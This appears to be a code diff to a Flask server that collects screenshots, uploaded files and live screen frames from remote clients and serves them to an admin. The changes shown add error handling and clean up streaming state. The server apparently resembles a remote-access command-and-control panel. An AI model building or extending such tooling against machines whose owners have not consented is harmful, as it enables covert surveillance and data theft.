@@ -1,8 +1,7 @@
 import os
 import uuid
 import time
-from datetime import datetime
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify, send_file, Response
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
@@ -40,6 +39,9 @@ def clean_clients():
             dead.append(cid)
     for d in dead:
         del clients[d]
+        # Also clean up streaming state for dead clients
+        if d in streaming_clients:
+            del streaming_clients[d]
 
 # --- Client API Endpoints ---
 
@@ -106,39 +108,42 @@ def result():
 @app.route('/api/upload', methods=['POST'])
 def upload_file():
     """Client uploads a file (screenshot or downloaded file)"""
-    client_id = request.form.get('id')
-    cmd_id = request.form.get('cmd_id')
-    is_stream_frame = request.form.get('is_stream_frame', 'false') == 'true'
-    
-    if not client_id or client_id not in clients:
-        return jsonify({"error": "Unknown client"}), 404
-    
-    if 'file' not in request.files:
-        return jsonify({"error": "No file part"}), 400
-    
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({"error": "No selected file"}), 400
-    
-    # For streaming frames, store directly in memory
-    if is_stream_frame:
-        file_data = file.read()
-        if client_id not in streaming_clients:
-            streaming_clients[client_id] = {}
-        streaming_clients[client_id]['last_frame'] = file_data
-        streaming_clients[client_id]['frame_time'] = time.time()
-        return jsonify({"status": "frame_received"})
-    
-    # Save file for regular uploads
-    filename = secure_filename(f"{client_id}_{int(time.time())}_{file.filename}")
-    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-    file.save(filepath)
-    
-    # Store the filename/path as the result for the admin to retrieve later
-    if cmd_id:
-        clients[client_id]['results'][cmd_id] = f"FILE_UPLOADED:{filename}"
+    try:
+        client_id = request.form.get('id')
+        cmd_id = request.form.get('cmd_id')
+        is_stream_frame = request.form.get('is_stream_frame', 'false') == 'true'
         
-    return jsonify({"status": "uploaded", "filename": filename})
+        if not client_id or client_id not in clients:
+            return jsonify({"error": "Unknown client"}), 404
+        
+        if 'file' not in request.files:
+            return jsonify({"error": "No file part"}), 400
+        
+        file = request.files['file']
+        if file.filename == '':
+            return jsonify({"error": "No selected file"}), 400
+        
+        # For streaming frames, store directly in memory
+        if is_stream_frame:
+            file_data = file.read()
+            if client_id not in streaming_clients:
+                streaming_clients[client_id] = {}
+            streaming_clients[client_id]['last_frame'] = file_data
+            streaming_clients[client_id]['frame_time'] = time.time()
+            return jsonify({"status": "frame_received"})
+        
+        # Save file for regular uploads
+        filename = secure_filename(f"{client_id}_{int(time.time())}_{file.filename}")
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        file.save(filepath)
+        
+        # Store the filename/path as the result for the admin to retrieve later
+        if cmd_id:
+            clients[client_id]['results'][cmd_id] = f"FILE_UPLOADED:{filename}"
+            
+        return jsonify({"status": "uploaded", "filename": filename})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 # --- Admin API Endpoints ---
 
@@ -201,7 +206,14 @@ def admin_response(cmd_id):
 @app.route('/admin/download_file/<filename>', methods=['GET'])
 def admin_download(filename):
     """Admin downloads a file uploaded by client"""
-    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(filename)))
+    try:
+        safe_filename = secure_filename(filename)
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
+        if os.path.exists(filepath):
+            return send_file(filepath)
+        return jsonify({"error": "File not found"}), 404
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/admin/stream_frame/<client_id>', methods=['GET'])
 def admin_stream_frame(client_id):
@@ -209,7 +221,6 @@ def admin_stream_frame(client_id):
     if client_id in streaming_clients:
         frame_data = streaming_clients[client_id].get('last_frame')
         if frame_data:
-            from flask import Response
             return Response(frame_data, mimetype='image/jpeg')
     return jsonify({"error": "No frame available"}), 404
 
